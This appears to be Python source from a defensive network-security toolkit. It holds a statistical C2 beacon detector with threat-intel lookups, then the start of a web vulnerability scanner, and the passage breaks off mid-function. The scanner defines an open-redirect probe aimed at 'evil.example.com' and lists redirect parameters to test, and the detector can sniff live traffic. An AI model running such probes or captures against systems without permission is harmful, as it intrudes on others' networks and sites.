_C2_WELL_KNOWN_CLEAN_PORTS = frozenset({80, 443, 53, 123, 22, 25, 587, 993, 995,
                                         143, 110, 21, 389, 636, 88, 161, 5353})


def _beacon_analyze_flow(ts_list: list[float], size_list: list[int], payload_bytes: int) -> dict[str, Any] | None:
    """
    Full statistical analysis of a single network flow for beaconing patterns.

    Tier 1 (always):
      - Mean / stdev / CV of inter-arrival intervals
      - Flow duration and packet count
      - Packet size mean and CV

    Tier 2 (numpy):
      - FFT dominant frequency → primary beacon period
      - Autocorrelation → period confirmation and jitter tolerance
      - Shannon entropy of payload bytes → encrypted traffic flag
      - Size CV for consistent-payload detection

    Returns an analysis dict, or None if the flow has fewer than 6 packets.
    """
    import statistics

    if len(ts_list) < 6:
        return None

    ts_sorted = sorted(ts_list)
    intervals = [ts_sorted[i + 1] - ts_sorted[i] for i in range(len(ts_sorted) - 1)]

    if not intervals:
        return None

    mean_iv = statistics.mean(intervals)
    std_iv  = statistics.pstdev(intervals)      # population stdev (we have the full set)
    cv      = std_iv / mean_iv if mean_iv > 0 else float("inf")

    result = {
        "n_packets":      len(ts_list),
        "duration_s":     ts_sorted[-1] - ts_sorted[0],
        "mean_iv_s":      mean_iv,
        "std_iv_s":       std_iv,
        "cv":             cv,
        "intervals":      intervals,
        "mean_size":      statistics.mean(size_list),
        "std_size":       statistics.pstdev(size_list),
        "size_cv":        0.0,
        "fft_period_s":   None,
        "fft_conf":       0.0,
        "acorr_peak":     0.0,
        "acorr_lag":      None,
        "entropy":        0.0,
        "numpy_used":     False,
    }

    if result["mean_size"] > 0:
        result["size_cv"] = result["std_size"] / result["mean_size"]

    # ── Numpy-enhanced analysis ────────────────────────────────────────
    try:
        import numpy as np
        arr = np.array(intervals, dtype=float)
        result["numpy_used"] = True

        # ── FFT dominant period ────────────────────────────────────────
        if len(arr) >= 8:
            arr_centered = arr - arr.mean()
            fft_mag      = np.abs(np.fft.rfft(arr_centered))
            freqs        = np.fft.rfftfreq(len(arr))
            fft_mag[0]   = 0.0                          # kill DC component
            if fft_mag.max() > 0:
                dom_idx  = int(np.argmax(fft_mag))
                dom_freq = freqs[dom_idx]
                if dom_freq > 0:
                    period_samples        = 1.0 / dom_freq
                    result["fft_period_s"] = float(period_samples * mean_iv)
                    # Confidence = peak power vs. average of all other bins
                    others = np.delete(fft_mag, dom_idx)
                    result["fft_conf"] = float(
                        min(1.0, fft_mag[dom_idx] / (others.mean() * len(fft_mag) + 1e-12))
                    )

        # ── Autocorrelation ────────────────────────────────────────────
        arr_norm = arr - arr.mean()
        std      = float(arr_norm.std())
        if std == 0:
            # Perfectly constant intervals — maximum beacon confidence
            result["acorr_peak"] = 1.0
            result["acorr_lag"]  = 1
        elif len(arr) >= 6:
            max_lag  = min(len(arr) // 2, 20)
            best_lag, best_r = 1, 0.0
            for lag in range(1, max_lag + 1):
                r = float(np.corrcoef(arr_norm[:-lag], arr_norm[lag:])[0, 1])
                if abs(r) > abs(best_r):
                    best_lag, best_r = lag, r
            result["acorr_peak"] = best_r
            result["acorr_lag"]  = best_lag

        # ── Shannon entropy of payload bytes ───────────────────────────
        if payload_bytes:
            ba      = np.frombuffer(bytes(payload_bytes[:8192]), dtype=np.uint8)
            counts  = np.bincount(ba, minlength=256).astype(float)
            total   = counts.sum()
            if total > 0:
                probs   = counts[counts > 0] / total
                result["entropy"] = float(-np.sum(probs * np.log2(probs)))

    except ImportError:
        pass    # numpy not installed — Tier 1 analysis only

    return result


def _beacon_score(analysis: dict[str, Any], dst_port: int) -> tuple[str | None, int, list[str]]:
    """
    Convert a flow analysis dict into a (confidence, score, flags) tuple.

    confidence: "HIGH" / "MEDIUM" / "LOW" / None (not flagged)
    score:      0-100 internal numeric score
    flags:      list of short descriptor strings for the report
    """
    cv      = analysis["cv"]
    n       = analysis["n_packets"]
    mean_iv = analysis["mean_iv_s"]
    flags   = []
    score   = 0

    # ── Primary gate: interval regularity ─────────────────────────────
    if cv < 0.10:
        score += 50; flags.append("VERY REGULAR (CV<0.10)")
    elif cv < 0.20:
        score += 35; flags.append("REGULAR (CV<0.20)")
    elif cv < 0.35:
        score += 15; flags.append("SOMEWHAT REGULAR (CV<0.35)")
    else:
        return None, 0, []   # not regular enough to be interesting

    # ── Interval range sanity (10 s → 4 h) ───────────────────────────
    if not (10.0 <= mean_iv <= 14_400.0):
        return None, 0, []

    # ── Packet count ──────────────────────────────────────────────────
    if n >= 50:   score += 20
    elif n >= 20: score += 12
    elif n >= 10: score += 6

    # ── FFT dominant period ───────────────────────────────────────────
    fft_conf = analysis.get("fft_conf", 0.0)
    fft_per  = analysis.get("fft_period_s")
    if fft_conf > 0.70:
        score += 15; flags.append(f"FFT CONFIRMED (period≈{fft_per:.1f}s, conf={fft_conf:.2f})")
    elif fft_conf > 0.40:
        score += 7;  flags.append(f"FFT WEAK (period≈{fft_per:.1f}s, conf={fft_conf:.2f})")

    # ── Autocorrelation ───────────────────────────────────────────────
    acorr = abs(analysis.get("acorr_peak", 0.0))
    alag  = analysis.get("acorr_lag")
    if acorr > 0.85:
        score += 15; flags.append(f"AUTOCORR STRONG (r={acorr:.2f} at lag {alag})")
    elif acorr > 0.60:
        score += 8;  flags.append(f"AUTOCORR MODERATE (r={acorr:.2f} at lag {alag})")

    # ── Payload entropy ───────────────────────────────────────────────
    entropy = analysis.get("entropy", 0.0)
    if entropy > 7.0:
        score += 10; flags.append(f"ENCRYPTED (entropy={entropy:.2f} bits/byte)")
    elif entropy > 5.5:
        score += 4;  flags.append(f"ENCODED/COMPRESSED (entropy={entropy:.2f})")
    elif 0 < entropy < 3.0:
        flags.append(f"LOW ENTROPY (plaintext? entropy={entropy:.2f})")

    # ── Consistent packet sizes ───────────────────────────────────────
    size_cv = analysis.get("size_cv", 1.0)
    if size_cv < 0.15:
        score += 8; flags.append(f"CONSISTENT SIZE (size CV={size_cv:.2f})")
    elif size_cv < 0.35:
        score += 3

    # ── Port classification ───────────────────────────────────────────
    if dst_port in _C2_HIGH_SUSPICION_PORTS:
        score += 20; flags.append(f"KNOWN C2/RAT PORT ({dst_port})")
    elif dst_port in _C2_MEDIUM_SUSPICION_PORTS:
        score += 10; flags.append(f"SUSPICIOUS PORT ({dst_port})")
    elif dst_port in _C2_WELL_KNOWN_CLEAN_PORTS:
        flags.append(f"COMMON LEGITIMATE PORT ({dst_port}) — verify")

    # ── Final tier ────────────────────────────────────────────────────
    if score >= 70:   return "HIGH",   score, flags
    if score >= 40:   return "MEDIUM", score, flags
    if score >= 20:   return "LOW",    score, flags
    return None, score, []


def _beacon_histogram(intervals: list[float], bins: int = 8, bar_width: int = 28) -> list[str]:
    """Return a list of ASCII histogram lines for the interval distribution."""
    if not intervals:
        return []
    lo, hi = min(intervals), max(intervals)
    if lo == hi:
        return [f"    {lo:.2f}s  {'█' * bar_width}  {len(intervals)}"]
    bucket  = (hi - lo) / bins
    counts  = [0] * bins
    for iv in intervals:
        idx = min(int((iv - lo) / bucket), bins - 1)
        counts[idx] += 1
    peak = max(counts) or 1
    out  = []
    for i, c in enumerate(counts):
        b_lo  = lo + i * bucket
        b_hi  = b_lo + bucket
        bars  = int((c / peak) * bar_width)
        out.append(f"    {b_lo:6.2f}–{b_hi:.2f}s  {'█' * bars:<{bar_width}}  {c}")
    return out


def run_c2_beacon_detector() -> None:
    """
    C2 Beacon Detector — multi-dimensional statistical analysis of network
    traffic for command-and-control beaconing patterns.

    Analysis dimensions:
      Tier 1 (always):   CV · packet count · port classification · size CV
      Tier 2 (numpy):    FFT dominant frequency · autocorrelation ·
                         Shannon entropy · interval histogram

    API enrichment (optional, keys from argus_config.json):
      AbuseIPDB · VirusTotal · GreyNoise · Shodan/InternetDB

    Only analyse traffic from networks you own or have explicit permission
    to monitor.
    """
    print_rule("C2 Beacon Detector")
    print("  Multi-dimensional beaconing analysis using interval statistics,")
    print("  FFT, autocorrelation, payload entropy, and API enrichment.\n")
    print("  ETHICAL NOTICE: only analyse captures from your own network or")
    print("  networks you have explicit written permission to monitor.\n")

    # ── Dependency checks ──────────────────────────────────────────────
    try:
        from scapy.layers.inet import IP, TCP, UDP
        from scapy.packet      import Raw
        from scapy.all         import rdpcap, sniff as scapy_sniff
    except ImportError:
        print("  [!] scapy is required: pip install scapy")
        input("\nPress Enter to return...")
        return

    try:
        import numpy as _np_check   # noqa: F401
        numpy_ok = True
        print("  [+] numpy detected — full Tier 2 analysis enabled (FFT, autocorr, entropy)")
    except ImportError:
        numpy_ok = False
        print("  [i] numpy not installed — Tier 1 analysis only (CV, port, size)")
        print("      Install with: pip install numpy")

    # ── API enrichment status ──────────────────────────────────────────
    _c2_config        = _load_argus_config()
    _c2_abuseipdb_key  = _c2_config.get("abuseipdb_key",  "")
    _c2_virustotal_key = _c2_config.get("virustotal_key", "")
    _c2_greynoise_key  = _c2_config.get("greynoise_key",  "")
    _c2_shodan_key     = _c2_config.get("shodan_key",     "")

    def _c2_key_line(name: str, key: str, note: str = "") -> None:
        status = f"[+] {name:<12} loaded" if key else f"[i] {name:<12} not configured"
        suffix = f"  ← {note}" if note and not key else ""
        print(f"  {status}{suffix}")

    print()
    print("  API enrichment (runs on flagged destination IPs after analysis):")
    _c2_key_line("AbuseIPDB",  _c2_abuseipdb_key)
    _c2_key_line("VirusTotal", _c2_virustotal_key)
    _c2_key_line("GreyNoise",  _c2_greynoise_key,
                 "key at viz.greynoise.io — best false-positive reducer")
    _c2_key_line("Shodan",     _c2_shodan_key)
    print("  [+] InternetDB  always available (free fallback for IP port data)")
    print()

    # ── Input mode ────────────────────────────────────────────────────
    print("  1. Analyse a PCAP file")
    print("  2. Live capture (requires root/admin)")
    mode = input("\n  Choice [1]: ").strip() or "1"

    packets = []

    if mode == "1":
        pcap_path = input("  PCAP file path: ").strip().strip('"')
        if not os.path.isfile(pcap_path):
            print(f"  [!] File not found: {pcap_path}")
            input("\nPress Enter to return...")
            return
        print(f"\n  [*] Reading {pcap_path} ...")
        try:
            packets = rdpcap(pcap_path)
            print(f"  [+] {len(packets):,} packets loaded.")
        except Exception as e:
            print(f"  [!] Could not read PCAP: {e}")
            input("\nPress Enter to return...")
            return

    elif mode == "2":
        raw_secs = input("  Capture duration (seconds) [30]: ").strip() or "30"
        secs     = int(raw_secs) if raw_secs.isdigit() else 30
        iface    = input("  Interface [leave blank for default]: ").strip() or None
        iface_str = iface or "default interface"
        print(f"\n  [*] Capturing on {iface_str} for {secs}s  (Ctrl-C to stop early)\n")
        print(f"  {'─'*62}")
        print(f"  {'NEW FLOW':<10}  {'Proto':<5}  {'Source':>15}  →  {'Destination'}")
        print(f"  {'─'*62}")

        import collections as _col
        live_packets = []
        live_counts  = _col.Counter()
        seen_flows   = set()

        def _pkt_cb(pkt: Any) -> None:
            live_packets.append(pkt)
            total = len(live_packets)

            src = dst = "?"
            proto = "OTHER"
            dport = 0

            if pkt.haslayer(IP):
                src = pkt[IP].src
                dst = pkt[IP].dst
                if pkt.haslayer(TCP):
                    proto = "TCP"
                    dport = pkt[TCP].dport
                    live_counts["TCP"] += 1
                elif pkt.haslayer(UDP):
                    proto = "UDP"
                    dport = pkt[UDP].dport
                    live_counts["UDP"] += 1
                else:
                    live_counts["OTHER"] += 1
            else:
                live_counts["OTHER"] += 1

            # Print each newly discovered flow on its own line
            flow_key = (src, dst, dport, proto)
            if flow_key not in seen_flows and proto in ("TCP", "UDP"):
                seen_flows.add(flow_key)
                # Clear the status line, print the new flow, then redraw status
                print(
                    f"\r  {'[new]':<10}  {proto:<5}  {src:>15}  →  {dst}:{dport}"
                    + " " * 8
                )

            # Always redraw the rolling status line
            print(
                f"\r  Packets: {total:>5}  |  "
                f"TCP:{live_counts['TCP']:>4}  "
                f"UDP:{live_counts['UDP']:>4}  "
                f"Other:{live_counts['OTHER']:>3}  |  "
                f"Unique flows: {len(seen_flows):>3}",
                end="", flush=True,
            )

        try:
            kwargs = {"timeout": secs, "store": False, "prn": _pkt_cb}
            if iface:
                kwargs["iface"] = iface
            scapy_sniff(**kwargs)
            packets = live_packets
            print(f"\n  {'─'*62}")
            print(f"  [+] Capture complete.")
            print(f"      Total packets : {len(packets):,}")
            print(f"      TCP           : {live_counts['TCP']:,}")
            print(f"      UDP           : {live_counts['UDP']:,}")
            print(f"      Other         : {live_counts['OTHER']:,}")
            print(f"      Unique flows  : {len(seen_flows):,}")
        except KeyboardInterrupt:
            packets = live_packets
            print(f"\n\n  [*] Capture stopped early — {len(packets):,} packets collected.")
        except PermissionError:
            print("\n  [!] Live capture requires root / administrator privileges.")
            input("\nPress Enter to return...")
            return
        except Exception as e:
            print(f"\n  [!] Capture failed: {e}")
            input("\nPress Enter to return...")
            return
    else:
        print("  [!] Invalid choice.")
        input("\nPress Enter to return...")
        return

    if not packets:
        print("  [!] No packets to analyse.")
        input("\nPress Enter to return...")
        return

    # ── Build flow table ───────────────────────────────────────────────
    # Key: (src_ip, dst_ip, dst_port, proto)
    # Value: {ts: [], sizes: [], payload_buf: bytearray}
    import collections
    flows = collections.defaultdict(lambda: {"ts": [], "sizes": [], "payload": bytearray()})

    min_ts = None
    for pkt in packets:
        if not pkt.haslayer(IP):
            continue
        src   = pkt[IP].src
        dst   = pkt[IP].dst
        ts    = float(pkt.time)
        size  = len(pkt)
        proto = "?"
        dport = 0

        if pkt.haslayer(TCP):
            proto = "TCP"
            dport = pkt[TCP].dport
        elif pkt.haslayer(UDP):
            proto = "UDP"
            dport = pkt[UDP].dport
        else:
            continue

        key = (src, dst, dport, proto)
        flows[key]["ts"].append(ts)
        flows[key]["sizes"].append(size)

        # Accumulate up to 8 KB of payload bytes per flow for entropy analysis
        if pkt.haslayer(Raw) and len(flows[key]["payload"]) < 8192:
            flows[key]["payload"].extend(bytes(pkt[Raw].load)[:256])

        if min_ts is None or ts < min_ts:
            min_ts = ts

    print(f"\n  [*] {len(flows):,} unique flows found. Analysing for beacons "
          f"(minimum 6 packets per flow) ...\n")

    # ── Analyse each flow ──────────────────────────────────────────────
    flagged = []   # list of (confidence, score, key, analysis, flags)

    for key, fdata in flows.items():
        if len(fdata["ts"]) < 6:
            continue
        src, dst, dport, proto = key
        analysis = _beacon_analyze_flow(fdata["ts"], fdata["sizes"], fdata["payload"])
        if analysis is None:
            continue
        confidence, score, a_flags = _beacon_score(analysis, dport)
        if confidence is not None:
            flagged.append((confidence, score, key, analysis, a_flags))

    # Sort: HIGH first, then MEDIUM, then LOW; within tier by score desc
    tier_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
    flagged.sort(key=lambda x: (tier_order.get(x[0], 9), -x[1]))

    if not flagged:
        print("  [+] No beaconing flows detected in this capture.")
        print("  [i] Tips: ensure the PCAP covers a long enough window (>5 min)")
        print("      and contains outbound traffic to external IPs.")
        input("\nPress Enter to return...")
        return

    high_n   = sum(1 for f in flagged if f[0] == "HIGH")
    med_n    = sum(1 for f in flagged if f[0] == "MEDIUM")
    low_n    = sum(1 for f in flagged if f[0] == "LOW")
    print(f"  [!] {len(flagged)} potential beacon flow(s): "
          f"{high_n} HIGH  {med_n} MEDIUM  {low_n} LOW\n")

    report_lines = [
        "C2 Beacon Detector Report",
        f"  Flows analysed : {len(flows):,}",
        f"  Flagged        : {len(flagged)} ({high_n} HIGH, {med_n} MEDIUM, {low_n} LOW)",
        f"  Numpy analysis : {'yes' if numpy_ok else 'no (install numpy for FFT/autocorr/entropy)'}",
        "",
    ]

    # ── Display each flagged flow ──────────────────────────────────────
    for confidence, score, key, analysis, flags in flagged:
        src, dst, dport, proto = key
        n         = analysis["n_packets"]
        dur_min   = analysis["duration_s"] / 60
        mean_iv   = analysis["mean_iv_s"]
        std_iv    = analysis["std_iv_s"]
        cv        = analysis["cv"]
        entropy   = analysis.get("entropy", 0.0)
        fft_per   = analysis.get("fft_period_s")
        fft_conf  = analysis.get("fft_conf", 0.0)
        acorr     = analysis.get("acorr_peak", 0.0)
        acorr_lag = analysis.get("acorr_lag")
        size_cv   = analysis.get("size_cv", 0.0)

        border = "═" * 62
        print(f"\n  {border}")
        print(f"  [{confidence} CONFIDENCE]  score={score}")
        print(f"  {src}  →  {dst}:{dport}/{proto}")
        print(f"  {border}")
        print(f"  Packets          : {n}  over {dur_min:.1f} min")
        print(f"  Mean interval    : {mean_iv:.2f} s")
        print(f"  Std deviation    : {std_iv:.2f} s")
        print(f"  CV               : {cv:.4f}")

        if fft_per is not None:
            print(f"  FFT period       : {fft_per:.2f} s  (confidence {fft_conf:.2f})")
        if acorr_lag is not None:
            print(f"  Autocorrelation  : r={acorr:.3f} at lag {acorr_lag}")
        if entropy > 0:
            enc_str = "  ← likely encrypted" if entropy > 7.0 else ""
            print(f"  Payload entropy  : {entropy:.3f} bits/byte{enc_str}")
        print(f"  Size CV          : {size_cv:.3f}")

        print(f"\n  Indicators:")
        for fl in flags:
            print(f"    · {fl}")

        print(f"\n  Interval distribution:")
        for hist_line in _beacon_histogram(analysis["intervals"], bins=8):
            print(hist_line)

        report_lines += [
            "",
            f"[{confidence}]  {src} → {dst}:{dport}/{proto}  score={score}",
            f"  Packets       : {n}  over {dur_min:.1f} min",
            f"  Mean interval : {mean_iv:.2f} s  (CV={cv:.4f})",
        ]
        if fft_per:
            report_lines.append(f"  FFT period    : {fft_per:.2f} s")
        if entropy > 0:
            report_lines.append(f"  Entropy       : {entropy:.3f} bits/byte")
        report_lines += [f"  Flag          : {fl}" for fl in flags]

    # ── API enrichment ─────────────────────────────────────────────────
    unique_dst_ips = list({key[1] for _, _, key, _, _ in flagged})

    abuseipdb_key  = _c2_abuseipdb_key
    virustotal_key = _c2_virustotal_key
    greynoise_key  = _c2_greynoise_key
    shodan_key     = _c2_shodan_key

    has_any_api = any([abuseipdb_key, virustotal_key, greynoise_key, shodan_key])
    do_enrich   = False

    if has_any_api:
        ans = input(f"\n  Run API enrichment on {len(unique_dst_ips)} unique destination IP(s)? (y/n) [y]: ").strip().lower() or "y"
        do_enrich = (ans == "y")
    else:
        print("\n  [i] No API keys configured — skipping enrichment.")
        print("      Add keys via option c on the main menu to enable live IP intel.")

    if do_enrich:
        report_lines += ["", "API ENRICHMENT"]
        print(f"\n  {'─'*62}")
        print(f"  API ENRICHMENT — {len(unique_dst_ips)} destination IP(s)")
        print(f"  {'─'*62}")

        import time as _time

        for ip in unique_dst_ips:
            print(f"\n  ── {ip} ────────────────────────────────────────────────")
            report_lines.append(f"\n  {ip}")
            ip_verdict_signals = []   # collect for confidence note

            # AbuseIPDB
            if abuseipdb_key:
                try:
                    d = _ioc_query_abuseipdb(ip, abuseipdb_key)
                    if "error" not in d:
                        score_ab  = d.get("abuseConfidenceScore", 0)
                        reports_n = d.get("totalReports", 0)
                        country   = d.get("countryCode", "?")
                        isp       = d.get("isp", "?")
                        verdict_s = "MALICIOUS" if score_ab >= 75 else "SUSPICIOUS" if score_ab >= 25 else "CLEAN"
                        print(f"  AbuseIPDB  : score={score_ab}/100  reports={reports_n}  "
                              f"country={country}  ISP={isp[:30]}  [{verdict_s}]")
                        report_lines.append(f"  AbuseIPDB: {score_ab}/100 ({reports_n} reports) [{verdict_s}]")
                        if score_ab >= 50:
                            ip_verdict_signals.append("MALICIOUS")
                    else:
                        print(f"  AbuseIPDB  : {_scrub_key(d['error'], abuseipdb_key)}")
                except Exception as e:
                    print(f"  AbuseIPDB  : query failed ({_scrub_key(e, abuseipdb_key)})")
                _time.sleep(0.3)

            # VirusTotal
            if virustotal_key:
                try:
                    vt = _ioc_query_virustotal(ip, "ip", virustotal_key)
                    if "error" not in vt:
                        attrs  = vt.get("attributes", {})
                        stats  = attrs.get("last_analysis_stats", {})
                        m      = stats.get("malicious",  0)
                        s      = stats.get("suspicious", 0)
                        total  = sum(stats.values())
                        ctry   = attrs.get("country", "?")
                        org    = attrs.get("as_owner", "?")
                        verdict_s = "MALICIOUS" if m >= 5 else "SUSPICIOUS" if m > 0 or s >= 3 else "CLEAN"
                        print(f"  VirusTotal : {m}/{total} malicious  {s} suspicious  "
                              f"country={ctry}  org={org[:30]}  [{verdict_s}]")
                        report_lines.append(f"  VirusTotal: {m}/{total} malicious [{verdict_s}]")
                        if m >= 5:
                            ip_verdict_signals.append("MALICIOUS")
                        elif m > 0 or s >= 3:
                            ip_verdict_signals.append("SUSPICIOUS")
                    elif vt.get("error") == "not_found":
                        print("  VirusTotal : not in database")
                    else:
                        print(f"  VirusTotal : {_scrub_key(vt.get('error','?'), virustotal_key)}")
                except Exception as e:
                    print(f"  VirusTotal : query failed ({_scrub_key(e, virustotal_key)})")
                _time.sleep(0.3)

            # GreyNoise — most valuable for false positive suppression
            if greynoise_key:
                try:
                    import requests as _req
                    gn_resp = _req.get(
                        f"https://api.greynoise.io/v3/community/{ip}",
                        headers={"key": greynoise_key},
                        timeout=10,
                    )
                    if gn_resp.status_code == 200:
                        gn        = gn_resp.json()
                        classif   = gn.get("classification", "unknown")
                        name      = gn.get("name", "?")
                        last_seen = gn.get("last_seen", "?")
                        print(f"  GreyNoise  : classification={classif}  name={name}  last_seen={last_seen}")
                        report_lines.append(f"  GreyNoise: {classif} ({name})")
                        if classif == "benign":
                            print("  [i] GreyNoise classifies this IP as BENIGN (internet background noise)")
                            print("      This flow may be a false positive — legitimate scanner/telemetry")
                            ip_verdict_signals.append("BENIGN_NOISE")
                        elif classif == "malicious":
                            ip_verdict_signals.append("MALICIOUS")
                    elif gn_resp.status_code == 404:
                        print("  GreyNoise  : IP not in GreyNoise dataset (not a known scanner)")
                    else:
                        print(f"  GreyNoise  : HTTP {gn_resp.status_code}")
                except Exception as e:
                    print(f"  GreyNoise  : query failed ({_scrub_key(e, greynoise_key)})")
                _time.sleep(0.3)

            # Shodan / InternetDB
            if shodan_key:
                try:
                    sd = _ioc_query_shodan_host(ip, shodan_key)
                    if "error" not in sd:
                        ports   = sd.get("ports", [])
                        org     = sd.get("org",     "?")
                        country = sd.get("country_name", "?")
                        vulns   = list((sd.get("vulns") or {}).keys())[:5]
                        tags    = sd.get("tags", [])
                        print(f"  Shodan     : org={org[:30]}  country={country}  "
                              f"open_ports={ports[:8]}  tags={tags}")
                        if vulns:
                            print(f"               known_vulns={vulns}")
                        report_lines.append(
                            f"  Shodan: org={org}  ports={ports}  vulns={vulns}"
                        )
                    else:
                        # Fall back to InternetDB (free, no key needed)
                        idb = _ioc_query_internetdb(ip)
                        if "error" not in idb:
                            ports  = idb.get("ports", [])
                            tags   = idb.get("tags",  [])
                            print(f"  InternetDB : open_ports={ports[:10]}  tags={tags}")
                            report_lines.append(f"  InternetDB: ports={ports}  tags={tags}")
                except Exception as e:
                    print(f"  Shodan     : query failed ({_scrub_key(e, shodan_key)})")
            else:
                # Always try InternetDB as free fallback
                try:
                    idb = _ioc_query_internetdb(ip)
                    if "error" not in idb:
                        ports = idb.get("ports", [])
                        tags  = idb.get("tags",  [])
                        print(f"  InternetDB : open_ports={ports[:10]}  tags={tags}")
                        report_lines.append(f"  InternetDB: ports={ports}  tags={tags}")
                except Exception:
                    pass
            _time.sleep(0.3)

            # ── Combined verdict note ──────────────────────────────────
            if "BENIGN_NOISE" in ip_verdict_signals:
                print(f"\n  [DOWNGRADE] {ip} — GreyNoise says BENIGN."
                      "Consider dismissing associated beacon flows.")
            elif ip_verdict_signals.count("MALICIOUS") >= 2:
                print(f"\n  [CONFIRMED] {ip} — Multiple sources confirm MALICIOUS."
                      " Beacon + known-bad IP is a HIGH-confidence C2 indicator.")
            elif "MALICIOUS" in ip_verdict_signals:
                print(f"\n  [ELEVATED] {ip} — At least one source flags as MALICIOUS."
                      " Correlate with beacon timing for confirmation.")

    # ── Summary table ──────────────────────────────────────────────────
    print(f"\n  {'═'*62}")
    print(f"  BEACON DETECTION SUMMARY")
    print(f"  {'═'*62}")
    print(f"  {'Confidence':<10}  {'Score':<6}  {'Flow (src→dst:port/proto)'}")
    print(f"  {'─'*62}")
    for confidence, score, key, analysis, flags in flagged:
        src, dst, dport, proto = key
        n       = analysis["n_packets"]
        mean_iv = analysis["mean_iv_s"]
        print(f"  {confidence:<10}  {score:<6}  {src} → {dst}:{dport}/{proto}"
              f"  ({n} pkts, {mean_iv:.1f}s interval)")
    print(f"  {'═'*62}")
    print(f"\n  [i] False positive note: regularly scheduled tasks, NTP,")
    print(f"      telemetry, and update clients can mimic beacon patterns.")
    print(f"      Cross-reference flagged IPs with the IOC Assistant (tool 14 → 7)")
    print(f"      and GreyNoise for context before escalating.")

    report_lines += [
        "",
        "SUMMARY TABLE",
        f"{'Confidence':<10}  {'Score':<6}  Flow",
    ]
    for confidence, score, key, analysis, _ in flagged:
        src, dst, dport, proto = key
        report_lines.append(
            f"{confidence:<10}  {score:<6}  {src} → {dst}:{dport}/{proto}  "
            f"({analysis['n_packets']} pkts, {analysis['mean_iv_s']:.1f}s)"
        )

    target_label = pcap_path if mode == "1" else f"live capture ({secs}s)"
    _save_tool_run(
        "c2_beacon", target_label,
        f"C2 beacon analysis: {len(flagged)} flagged ({high_n} HIGH, {med_n} MEDIUM, {low_n} LOW)",
        "\n".join(report_lines),
    )
    input("\nPress Enter to return...")


def run_packet_sniffer() -> None:
    """Packet tools: live scapy capture, dpkt offline PCAP analysis, C2 beacon detection."""
    while True:
        print_rule("Packet Analysis")
        print("  1. Live packet sniffer (scapy)")
        print("  2. Analyze saved PCAP/PCAPNG (dpkt)")
        print("  3. C2 Beacon Detector  (FFT + autocorr + entropy + API enrichment)")
        print("  q. Back")
        choice = input("\n  Choice: ").strip().lower()
        if choice == "1":
            run_live_packet_sniffer()
        elif choice == "2":
            run_pcap_analyzer()
        elif choice == "3":
            run_c2_beacon_detector()
        elif choice == "q":
            return
        else:
            print("  [!] Invalid choice.")


# ─────────────────────────────────────────────
#  WEB VULNERABILITY SCANNER
# ─────────────────────────────────────────────

# Severity constants (used to tag every finding)
SEV_CRITICAL = "CRITICAL"
SEV_HIGH     = "HIGH"
SEV_MEDIUM   = "MEDIUM"
SEV_LOW      = "LOW"
SEV_INFO     = "INFO"
SEV_ORDER    = [SEV_CRITICAL, SEV_HIGH, SEV_MEDIUM, SEV_LOW, SEV_INFO]

# Display config per severity: (label, ascii_prefix)
SEV_DISPLAY = {
    SEV_CRITICAL: ("CRITICAL", "[!!!]"),
    SEV_HIGH:     ("HIGH",     "[ !! ]"),
    SEV_MEDIUM:   ("MEDIUM",   "[  ! ]"),
    SEV_LOW:      ("LOW",      "[  * ]"),
    SEV_INFO:     ("INFO",     "[  i ]"),
}

# Security headers: (name, severity_if_missing, explanation, fix)
SECURITY_HEADERS = [
    (
        "Strict-Transport-Security", SEV_HIGH,
        "HSTS missing -- browsers can be downgraded from HTTPS to HTTP.",
        "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains",
    ),
    (
        "Content-Security-Policy", SEV_HIGH,
        "No CSP -- XSS payloads can load scripts from any origin.",
        "Start with: Content-Security-Policy: default-src 'self'",
    ),
    (
        "X-Frame-Options", SEV_MEDIUM,
        "Page can be embedded in an <iframe> (clickjacking risk).",
        "Add: X-Frame-Options: DENY  or  SAMEORIGIN",
    ),
    (
        "X-Content-Type-Options", SEV_MEDIUM,
        "Browser may MIME-sniff responses into executable types.",
        "Add: X-Content-Type-Options: nosniff",
    ),
    (
        "X-XSS-Protection", SEV_LOW,
        "Legacy XSS filter header missing (affects older IE/Edge).",
        "Add: X-XSS-Protection: 1; mode=block",
    ),
    (
        "Referrer-Policy", SEV_LOW,
        "Full URL may leak as Referer to third-party sites.",
        "Add: Referrer-Policy: strict-origin-when-cross-origin",
    ),
    (
        "Permissions-Policy", SEV_LOW,
        "Browser APIs (camera, mic, geolocation) are unrestricted.",
        "Add: Permissions-Policy: geolocation=(), microphone=(), camera=()",
    ),
]

# Cookie flags: (flag_name, severity_if_missing, explanation)
COOKIE_FLAGS = [
    ("Secure",   SEV_HIGH,   "Cookie sent over plain HTTP -- can be intercepted in transit."),
    ("HttpOnly", SEV_MEDIUM, "Cookie accessible via JS -- XSS can steal session tokens."),
    ("SameSite", SEV_MEDIUM, "No SameSite attribute -- CSRF attacks may succeed."),
]

# Redirect parameters tested for open redirect
REDIRECT_PARAMS = [
    "next", "url", "redirect", "redirect_to", "redirect_url",
    "return", "return_to", "returnUrl", "goto", "target",
    "redir", "destination", "forward", "location",
]
OPEN_REDIRECT_PAYLOAD = "https://evil.example.com"

# HTTP methods that should rarely be publicly exposed
DANGEROUS_METHODS = {"TRACE", "CONNECT", "DELETE", "PUT", "PATCH"}


class Issue:
    """A single scanner finding with severity, category, title, detail, and fix."""

    def __init__(self, severity: str, category: str, title: str, detail: str, fix: str | None = None) -> None:
        self.severity = severity
        self.category = category
        self.title    = title
        self.detail   = detail
        self.fix      = fix


# ── Individual check functions ────────────────────────────────────────────────

def _check_https(url: str, issues: list["Issue"]) -> bool:
    """Flag plain HTTP transport as HIGH severity."""
    if not url.startswith("https://"):
        issues.append(Issue(
            SEV_HIGH, "Transport",
            "Site served over plain HTTP (unencrypted)",
            "All traffic is visible to anyone on the network path.",
            "Obtain a TLS certificate (e.g. Let's Encrypt) and redirect HTTP -> HTTPS.",
        ))
        return False
    return True


def _check_hsts_config(response: Any, issues: list["Issue"]) -> None:
    """
    Check HSTS header for strong configuration once we know it's present.
    Flags missing 'preload' and missing 'includeSubDomains' as LOW issues.
    """
    hsts = response.headers.get("Strict-Transport-Security", "")
    if not hsts:
        return
    if "preload" not in hsts.lower():
        issues.append(Issue(
            SEV_LOW, "Security Headers",
            "HSTS lacks 'preload' directive",
            f"Current value: {hsts}",
            "Add 'preload' and submit domain to https://hstspreload.org",
        ))
    if "includesubdomains" not in hsts.lower():
        issues.append(Issue(
            SEV_LOW, "Security Headers",
            "HSTS lacks 'includeSubDomains' directive",
            f"Current value: {hsts}",
